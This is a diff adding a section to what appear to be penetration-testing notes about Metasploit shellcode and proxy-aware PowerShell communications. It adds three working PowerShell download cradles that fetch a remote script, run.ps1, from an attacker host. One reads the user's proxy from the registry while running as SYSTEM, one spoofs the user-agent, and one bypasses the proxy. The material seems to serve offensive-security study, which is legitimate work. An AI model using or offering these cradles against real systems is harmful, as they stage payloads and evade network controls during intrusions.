@@ -195,3 +195,42 @@ PrependMigrate             false                      yes       Spawns and runs 
 (In a nutshell it spawns our shellcode in another process)
 
 Additionally keep in mind that our shellcode must be for 32-bits -> very important, if we use x64 we won't get any shell
+
+**PowerShell Proxy-aware communications:**
+
+As a SYSTEM integrity proxy-aware communication:
+
+```
+#This is powershell code, therefore it must be inside a powershell script
+
+New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
+$keys = Get-ChildItem 'HKU:\'
+ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start =
+$key.Name.substring(10);break}}
+$proxyAddr=(Get-ItemProperty -Path
+"HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
+[system.net.webrequest]::DefaultWebProxy = new-object
+System.Net.WebProxy("http://$proxyAddr")
+$wc = new-object system.net.WebClient
+$wc.DownloadString("http://192.168.1.1/run.ps1")
+```
+
+Fiddling with the user-agent:
+
+```
+#This is powershell code, therefore it must be inside a powershell script
+
+$wc = new-object system.net.WebClient
+$wc.Headers.Add('User-Agent', "UniqueUserAgent123456...")
+$wc.DownloadString("http://192.168.1.1/run.ps1")
+```
+
+Evading the proxy:
+
+```
+#This is powershell code, therefore it must be inside a powershell script
+
+$wc = new-object system.net.WebClient
+$wc.proxy = $null
+$wc.DownloadString("http://192.168.1.1/run.ps1")
+```
